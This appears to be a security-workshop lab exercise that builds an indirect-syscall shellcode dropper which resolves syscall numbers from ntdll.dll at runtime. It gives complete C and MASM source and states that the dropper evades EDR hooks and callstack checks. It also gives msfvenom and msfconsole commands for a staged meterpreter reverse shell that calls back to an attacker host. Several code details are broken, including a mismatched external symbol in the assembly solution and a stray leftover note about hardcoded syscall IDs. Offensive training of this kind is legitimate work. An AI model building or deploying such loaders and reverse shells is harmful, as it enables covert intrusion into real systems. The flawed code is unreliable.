## LAB Exercise 6: Dynamic Retrieval from SSNs

In the first bonus chapter we want to further develop our indirect syscall dropper. Until now, we had the limitation that our dropper would only work in the context of the Windows version that was used to debug the system service numbers (SSNs) for the used native functions ``NtAllocateVirtualMemory``, ``NtWriteVirtualMemory``, ``NtCreateThreadEx`` and ``NtWaitForSingleObject``. Why? Because to get the basics for direct and indirect syscalls, we have implemented the SSNs as hardcoded values in our assembly resource file. But normally, when we are preparing for a red team engagement, we do not know the Windows version of our target client. So we want to make our indirect syscall dropper a bit more flexible and instead of hardcoding the SSNs, we want to retrieve them dynamically at runtime from ntdll.dll. 
  

## Exercise 6 Tasks: 
### Develop your indirect syscall dropper to dynamically retrieve SSNs.
| Task Nr.   | Task Description |
| :---:      | ---              |
|  1         | Download indirect syscall POC from the code section of this chapter.                 |
|  2         | Most of the code is already implemented. However, to implement the dynamic SSN retrieval functionality, you will need to complete the following tasks: <ul><li>Complete the missing code in the main code section</li><li>Complete the missing code in the ``syscalls.asm`` file</li></ul>                  |
|  3          | Create a staged x64 meterpreter shellcode with msfvenom, copy it to the poc and compile the poc.                 |
|  4          | Create and run a staged x64 meterpreter listener using msfconsole.                  |
| 5           | un your compiled .exe and check that a stable command and control channel opens.                 |


### Analyse the Dropper
| Task Nr.   | Task Description |
| :---:      | ---              |
| 6          | Use **x64dbg** to debug or analyse the dropper. <ul><li>What differences can you see between a dropper with hardcoded SSNs and a dropper that dynamically retrieves SSNs at runtime?</li></ul>                |

## Visual Studio
You can download the indirect syscall poc from the code section of this chapter. To retrieve the SSNs dynamicalla at runtime from ntdll.dll, we have to implement the following code. 

### Start Address Native Function
In order to be able to dynamically retrieve the SSN for each of the native functions used in our code, we first need to define a pointer to a function that holds the start address of that function. If you remember, this part of the code was already implemented in the chapter where we built the indirect syscall dropper, because we used the same principle to get the address for the syscall instruction of each function. This means that part of the code in the main file is already implemented.  
<details>
<summary>Code</summary>
    
```C
// Declare and initialize a pointer to the NtAllocateVirtualMemory function and get the address of the NtAllocateVirtualMemory function in the ntdll.dll module
    UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    UINT_PTR pNtCreateThreadEx = (UINT_PTR)GetProcAddress(hNtdll, "NtCreateThreadEx");
    UINT_PTR pNtWaitForSingleObject = (UINT_PTR)GetProcAddress(hNtdll, "NtWaitForSingleObject");     
```
     
</details>

### Memory Address System Service Number (SSN)
In the next step, we want to get the effective memory address from the ``SSN`` in the ``syscall stub`` of the native function by adding the necessary offset to the start address of the native function that we retrieved in the previous step. To get the memory address from the syscall instruction, we need to add ``4-bytes``. Why 4-bytes? Because this is the offset calculated from the start address of the native function.

<details>
    <p align="center">
<img width="1000" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/1b6bd7f1-1323-48d1-bcb2-83d4395c49bb"> 
    </p>
</details>   


In the indirect syscall poc in this chapter, this code is implemented only for the native function ``NtAllocateVirtualMemory`` and must be completed by the workshop attendee based on the code scheme for ``NtAllocateVirtualMemory`` which can be seen in the code section below.  
<details>
<summary>Code</summary>
    
```C
// Here we're retrieving the system call number for each function. The syscall number is used to identify the syscall when the program uses the syscall instruction.
    // It's assumed that the syscall number is located 4 bytes into the function.
    wNtAllocateVirtualMemory = ((unsigned char*)(pNtAllocateVirtualMemory + 4))[0];     
```
     
</details>   

If it was not possible for you to complete this code section, don`t worry it will work next time and additionally you can find the complete code in the following solution section. 

<details>
<summary>Solution</summary>
    
```C
// Here we're retrieving the system call number for each function. The syscall number is used to identify the syscall when the program uses the syscall instruction.
    // It's assumed that the syscall number is located 4 bytes into the function.
    wNtAllocateVirtualMemory = ((unsigned char*)(pNtAllocateVirtualMemory + 4))[0];
    wNtWriteVirtualMemory = ((unsigned char*)(pNtWriteVirtualMemory + 4))[0];
    wNtCreateThreadEx = ((unsigned char*)(pNtCreateThreadEx + 4))[0];
    wNtWaitForSingleObject = ((unsigned char*)(pNtWaitForSingleObject + 4))[0];    
```
     
</details>

### Global Variables
To store the memory address from the SSN of the respective native function, and also to be able to provide the memory address later for the assembly code in the ``syscalls.asm`` file, we declare a global variable for each SSN address, which is declared as a DWORD. Also in this case in the indirect syscall poc of this chapter, this code is implemented only for the native function ``NtAllocateVirtualMemory`` and must be completed by the workshop attendee based on the code scheme for ``NtAllocateVirtualMemory`` which can be seen in the code section below.

<details>
<summary>Code</summary>
    
```C
// Global DWORD (double words) that will hold the SSN
DWORD wNtAllocateVirtualMemory;       
```
     
</details>   

If it was not possible for you to complete this code section, don`t worry it will work next time and additionally you can find the complete code in the following solution section. 

<details>
<summary>Solution</summary>
    
```C
// Declare global variables to hold the syscall instruction addresses
DWORD wNtAllocateVirtualMemory;
DWORD wNtWriteVirtualMemory;
DWORD wNtCreateThreadEx;
DWORD wNtWaitForSingleObject;     
```
     
</details>


The full main code of the indirect syscall dropper which retrieves the SSNs dynamically looks like this, and is already implemented in the poc from this chapter and can be downloaded. Again, we use the same native APIs to allocate memory, write memory, create a new thread and wait for exit.

<details>
<summary>Code</summary>
    
```C
#include <windows.h>  
#include <stdio.h>    
#include "syscalls.h"

// Declare global variables to hold the syscall instruction addresses
UINT_PTR sysAddrNtAllocateVirtualMemory;
UINT_PTR sysAddrNtWriteVirtualMemory;
UINT_PTR sysAddrNtCreateThreadEx;
UINT_PTR sysAddrNtWaitForSingleObject;
  
DWORD wNtAllocateVirtualMemory;  // Will hold the syscall number for NtAllocateVirtualMemory
DWORD wNtWriteVirtualMemory;  // Will hold the syscall number for NtWriteVirtualMemory
DWORD wNtCreateThreadEx;  // Will hold the syscall number for NtCreateThreadEx
DWORD wNtWaitForSingleObject;  // Will hold the syscall number for NtWaitForSingleObject
 


int main() {
    PVOID allocBuffer = NULL;  // Declare a pointer to the buffer to be allocated
    SIZE_T buffSize = 0x1000;  // Declare the size of the buffer (4096 bytes)

    // Get a handle to the ntdll.dll library
    HANDLE hNtdll = GetModuleHandleA("ntdll.dll");

    // Declare and initialize a pointer to the NtAllocateVirtualMemory function and get the address of the NtAllocateVirtualMemory function in the ntdll.dll module
    UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    UINT_PTR pNtCreateThreadEx = (UINT_PTR)GetProcAddress(hNtdll, "NtCreateThreadEx");
    UINT_PTR pNtWaitForSingleObject = (UINT_PTR)GetProcAddress(hNtdll, "NtWaitForSingleObject");


    // The syscall stub (actual system call instruction) is some bytes further into the function. 
    // In this case, it's assumed to be 0x12 (18 in decimal) bytes from the start of the function.
    // So we add 0x12 to the function's address to get the address of the system call instruction.
    sysAddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;
    sysAddrNtWriteVirtualMemory = pNtWriteVirtualMemory + 0x12;
    sysAddrNtCreateThreadEx = pNtCreateThreadEx + 0x12;
    sysAddrNtWaitForSingleObject = pNtWaitForSingleObject + 0x12;
  
  
    // Here we're retrieving the system call number for each function. The syscall number is used to identify the syscall when the program uses the syscall instruction.
    // It's assumed that the syscall number is located 4 bytes into the function.
    wNtAllocateVirtualMemory = ((unsigned char*)(pNtAllocateVirtualMemory + 4))[0];
    wNtWriteVirtualMemory = ((unsigned char*)(pNtWriteVirtualMemory + 4))[0];
    wNtCreateThreadEx = ((unsigned char*)(pNtCreateThreadEx + 4))[0];
    wNtWaitForSingleObject = ((unsigned char*)(pNtWaitForSingleObject + 4))[0];


    // Use the NtAllocateVirtualMemory function to allocate memory for the shellcode
    NtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&allocBuffer, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

    // Define the shellcode to be injected
    unsigned char shellcode[] = "\xfc\x48\x83...";

    ULONG bytesWritten;
    // Use the NtWriteVirtualMemory function to write the shellcode into the allocated memory
    NtWriteVirtualMemory(GetCurrentProcess(), allocBuffer, shellcode, sizeof(shellcode), &bytesWritten);

    HANDLE hThread;
    // Use the NtCreateThreadEx function to create a new thread that starts executing the shellcode
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)allocBuffer, NULL, FALSE, 0, 0, 0, NULL);

    // Use the NtWaitForSingleObject function to wait for the new thread to finish executing
    NtWaitForSingleObject(hThread, FALSE, NULL);

    // Return 0 to indicate successful execution of the program.
    return 0;
}
```
    
</details>





### Header File
Like the indirect syscall dropper with hardcodes SSNs, we **no longer ask ntdll.dll** for the function definition of the native APIs we use. But we still want to use the native functions, so we need to define or **directly implement** the structure for all four native functions in a header file. In this case, the header file should be called **syscalls.h**. The syscalls.h file does not currently exist in the syscall poc folder, your task is to add a new header file named syscalls.h and implement the required code. The code for the syscalls.h file can be found in the code section below. You will also need to include the header ``syscalls.h`` in the main code. This taks is redundant if you have already implemented the ``syscalls.h`` in your indirect syscall dropper from before (hardcoded SSNs).

<details>
<summary>Code</summary>

```C
#ifndef _SYSCALLS_H  // If _SYSCALLS_H is not defined then define it and the contents below. This is to prevent double inclusion.
#define _SYSCALLS_H  // Define _SYSCALLS_H

#include <windows.h>  // Include the Windows API header

#ifdef __cplusplus   // If this header file is included in a C++ file, then this section will be true
extern "C" {         // This is to ensure that the names of the functions are not mangled by the C++ compiler and are in C linkage format
#endif

    // The type NTSTATUS is typically defined in the Windows headers as a long.
    typedef long NTSTATUS;  // Define NTSTATUS as a long
    typedef NTSTATUS* PNTSTATUS;  // Define a pointer to NTSTATUS

    // Declare the function prototype for NtAllocateVirtualMemory
    extern NTSTATUS NtAllocateVirtualMemory(
        HANDLE ProcessHandle,    // Handle to the process in which to allocate the memory
        PVOID* BaseAddress,      // Pointer to the base address
        ULONG_PTR ZeroBits,      // Number of high-order address bits that must be zero in the base address of the section view
        PSIZE_T RegionSize,      // Pointer to the size of the region
        ULONG AllocationType,    // Type of allocation
        ULONG Protect            // Memory protection for the region of pages
    );

    // Declare the function prototype for NtWriteVirtualMemory
    extern NTSTATUS NtWriteVirtualMemory(
        HANDLE ProcessHandle,     // Handle to the process in which to write the memory
        PVOID BaseAddress,        // Pointer to the base address
        PVOID Buffer,             // Buffer containing data to be written
        SIZE_T NumberOfBytesToWrite, // Number of bytes to be written
        PULONG NumberOfBytesWritten // Pointer to the variable that receives the number of bytes written
    );

    // Declare the function prototype for NtCreateThreadEx
    extern NTSTATUS NtCreateThreadEx(
        PHANDLE ThreadHandle,        // Pointer to a variable that receives a handle to the new thread
        ACCESS_MASK DesiredAccess,   // Desired access to the thread
        PVOID ObjectAttributes,      // Pointer to an OBJECT_ATTRIBUTES structure that specifies the object's attributes
        HANDLE ProcessHandle,        // Handle to the process in which the thread is to be created
        PVOID lpStartAddress,        // Pointer to the application-defined function of type LPTHREAD_START_ROUTINE to be executed by the thread
        PVOID lpParameter,           // Pointer to a variable to be passed to the thread
        ULONG Flags,                 // Flags that control the creation of the thread
        SIZE_T StackZeroBits,        // A pointer to a variable that specifies the number of high-order address bits that must be zero in the stack pointer
        SIZE_T SizeOfStackCommit,    // The size of the stack that must be committed at thread creation
        SIZE_T SizeOfStackReserve,   // The size of the stack that must be reserved at thread creation
        PVOID lpBytesBuffer          // Pointer to a variable that receives any output data from the system
    );

    // Declare the function prototype for NtWaitForSingleObject
    extern NTSTATUS NtWaitForSingleObject(
        HANDLE Handle,          // Handle to the object to be waited on
        BOOLEAN Alertable,      // If set to TRUE, the function returns when the system queues an I/O completion routine or APC for the thread
        PLARGE_INTEGER Timeout  // Pointer to a LARGE_INTEGER that specifies the absolute```c
        // or relative time at which the function should return, regardless of the state of the object
    );

#ifdef __cplusplus  // End of the 'extern "C"' block if __cplusplus was defined
}
#endif

#endif // _SYSCALLS_H  // End of the _SYSCALLS_H definition
  
```
    
</details>
    
<details>
<summary>Results</summary>   
    <p align="center">
<img width="500" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/5fbb39c6-be30-4641-8652-6b98e478e17f"> 
    </p>
    <p align="center">   
    <img width="800" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/d116e34d-8bea-4d4b-a437-a27594218a5b">
    </p>
    <p align="center">
    <img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/4b3e7f58-b6c1-492a-9516-46dcf3af942c">
    </p>
</details>  

 ### Assembly Instructions
Again, we don't want to ask ntdll for the syscall stub, but in this case we want to replace the hardcoded SSN with the variable that holds the SSN for the respective native function. Therefore, we need to complete the code in the ``syscalls.asm`` file. The code below shows the assembler code for the syscall stub of ``NtAllocateVirtualMemory'' which is already implemented in the syscalls.asm file in context of the indirect syscall dropper.  
  
<details>
<summary>Code</summary>

```asm
  EXTERN wNtAllocateVirtualMemory:DWORD               ; Holds the dynamic retrieved SSN for NtAllocateVirtualMemory 
  EXTERN sysAddrNtAllocateVirtualMemory:QWORD         ; Holds the actual address of the NtAllocateVirtualMemory syscall in ntdll.dll.
     
.CODE  ; Start the code section

; Procedure for the NtAllocateVirtualMemory syscall
NtAllocateVirtualMemory PROC
    mov r10, rcx                                    ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.
    mov eax, wNtAllocateVirtualMemory               ; Move the syscall number into the eax register.
    jmp QWORD PTR [sysAddrNtAllocateVirtualMemory]  ; Jump to the actual syscall.
NtAllocateVirtualMemory ENDP                     	; End of the procedure.     
     
END  ; End of the module     
     
```
 
</details>
  
It is **your task** to **add** the ``syscalls.asm`` file as a resource (existing item) to the indirect syscall dropper project and **complete the assembler code and C code** for the other three missing native APIs ``NtWriteVirtualMemory``, ``NtCreateThreadEx`` and ``NtWaitForSingleObject``.

If you are unable to complete the assembly code at this time, you can use the assembly code from the solution and paste it into the ``syscalls.asm`` file in the **direct syscall dropper poc**. **Note** that the syscalls IDs are for **Windows 10 Enterprise 22H2** and may not work for your target. You may need to replace the syscalls IDs with the correct syscalls IDs for your target Windows version.
    
<details>
    <summary>Solution</summary>

```asm
  
EXTERN wNtAllocateVirtualMemory:DWORD               ; Holds the dynamic retrieved SSN for NtAllocateVirtualMemory
EXTERN wNtWriteVirtualMemory:DWORD                  ; Holds the dynamic retrieved SSN for NtWriteVirtualMemory
EXTERN wNtCreateThreadEx:DWORD                      ; Holds the dynamic retrieved SSN for NtCreateThreadEx
EXTERN wNtWaitForSingleObject:DWORD                 ; Holds the dynamic retrieved SSN for NtWaitForSingleObject

EXTERN sysAddrNtAllocateVirtualMemory:QWORD         ; The actual address of the NtAllocateVirtualMemory syscall in ntdll.dll.
EXTERN sysAddrNt:QWORD                              ; The actual address of the NtWriteVirtualMemory syscall in ntdll.dll.
EXTERN sysAddrNtCreateThreadEx:QWORD                ; The actual address of the NtCreateThreadEx syscall in ntdll.dll.
EXTERN sysAddrNtWaitForSingleObject:QWORD           ; The actual address of the NtWaitForSingleObject syscall in ntdll.dll.


.CODE  ; Start the code section

; Procedure for the NtAllocateVirtualMemory syscall
NtAllocateVirtualMemory PROC
    mov r10, rcx                                    ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.
    mov eax, wNtAllocateVirtualMemory               ; Move the syscall number into the eax register.
    jmp QWORD PTR [sysAddrNtAllocateVirtualMemory]  ; Jump to the actual syscall.
NtAllocateVirtualMemory ENDP                     	  ; End of the procedure.


; Similar procedures for NtWriteVirtualMemory syscalls
NtWriteVirtualMemory PROC
    mov r10, rcx
    mov eax, wNtWriteVirtualMemory
    jmp QWORD PTR [sysAddrNtWriteVirtualMemory]
NtWriteVirtualMemory ENDP


; Similar procedures for NtCreateThreadEx syscalls
NtCreateThreadEx PROC
    mov r10, rcx
    mov eax, wNtCreateThreadEx
    jmp QWORD PTR [sysAddrNtCreateThreadEx]
NtCreateThreadEx ENDP


; Similar procedures for NtWaitForSingleObject syscalls
NtWaitForSingleObject PROC
    mov r10, rcx
    mov eax, wNtWaitForSingleObject
    jmp QWORD PTR [sysAddrNtWaitForSingleObject]
NtWaitForSingleObject ENDP

END  ; End of the module
```
    
</details>


  
### Microsoft Macro Assembler (MASM)
We have already implemented all the necessary assembler code in the syscalls.asm file. But in order for the code to be interpreted correctly within the direct syscall poc, we need to do a few things. These steps are not done in the downloadable poc and must be done manually. First, we need to **enable support** for **Microsoft Macro Assembler (MASM)** in the Visual Studio project by enabling the option in Build Dependencies/Build Customisations.
     
<details>
<summary>Solution</summary> 
<p align="center">
<img width="1278" alt="image" src="https://user-images.githubusercontent.com/50073731/235457590-371f3519-b7cf-483d-9c1c-6bfd6368be42.png">
<img width="590" alt="image" src="https://user-images.githubusercontent.com/50073731/235457782-780d2136-30d7-4e87-a022-687ed2557b33.png">
</details>

We also need to set the **item type** of the **syscalls.asm** file to Microsoft Macro Assembler, otherwise we will get an unresolved symbol error in the context of the native APIs used in the direct syscall dropper. We also set Excluded from Build to no and Content to yes. 
     
<details>
<summary>Solution</summary> 
    <p align="center">
<img width="950" alt="image" src="https://user-images.githubusercontent.com/50073731/235471947-4bcd23fc-5093-4f4d-adc8-eb3ef36f139f.png">    
<img width="1237" alt="image" src="https://user-images.githubusercontent.com/50073731/235458968-e330799e-51ff-46bf-97ab-c7d3be7ea079.png">
<img width="778" alt="image" src="https://user-images.githubusercontent.com/50073731/235459219-4387dc48-56f8-481c-b978-1b786843a836.png">
    </p>
</details>     

    

## Meterpreter Shellcode
Again, we will create our meterpreter shellcode with msfvenom in Kali Linux. To do this, we will use the following command and create x64 staged meterpreter shellcode.
<details>
    
 **kali>**   
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Kali LPORT=80 -f c > /tmp/shellcode.txt
```
<p align="center">
<img width="800" alt="image" src="https://user-images.githubusercontent.com/50073731/235358025-7267f8c6-918e-44e9-b767-90dbd9afd8da.png">
</p>

The shellcode can then be copied into the direct syscall dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.<p align="center">
<img width="600" alt="image" src="https://user-images.githubusercontent.com/50073731/235414557-d236582b-5bab-4754-bd12-5f7817660c3a.png">
</p>
</details>    


## MSF-Listener
Before we test the functionality of our direct syscall dropper, we need to create a listener within msfconsole.
<details>
    
**kali>**
```
msfconsole
```
**msf>**
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost IPv4_Redirector_or_IPv4_Kali
set lport 80 
set exitonsession false
run
```
<p align="center">
<img width="600" alt="image" src="https://user-images.githubusercontent.com/50073731/235358630-09f70617-5f6e-4f17-b366-131f8efe19d7.png">
</p>
</details>
 
    
Once the listener has been successfully started, you can run your compiled direct syscall dropper. If all goes well, you should see an incoming command and control session. 
<details>
    
<p align="center">
<img width="800" alt="image" src="https://user-images.githubusercontent.com/50073731/235369228-84576762-b3b0-4cf7-a265-538995d42c40.png">
</p>
</details>
        
    
    
## Dropper Analysis: x64dbg 
The first step is to run your direct syscall dropper, check that the .exe is running and that a stable meterpreter C2 channel is open. 
Then we open x64dbg and attach to the running process, note that if you open the indirect syscall dropper directly in x64dbg, you need to run the assembly first.
     
<details>
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/a8509e63-ddea-4dee-894f-b2266bb3e504">
</p>
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/3547125b-a8c2-4e17-b7ec-84434181cf36">
</p>    
</details>
  
Then we want to analyse the dropper and compare our findings with the dropper which uses hardcoded SSNs
  
  
  ## Summary:
- Made transition from hardcodes SSNs to dynamicall retrieved SSNs
- Dropper imports no longer Windows APIs from kernel32.dll
- Dropper imports no longer Native APIs from ntdll.dll
- Only a part of the syscall stub is directly implemented into .text section of the dropper itself
- The syscall- and return statement are executed from memory of ntdll.dll
- User mode hooks in ntdll.dll and EDR can be bypassed 
- EDR detection based on checking the return adress in the callstack can be bypassed.
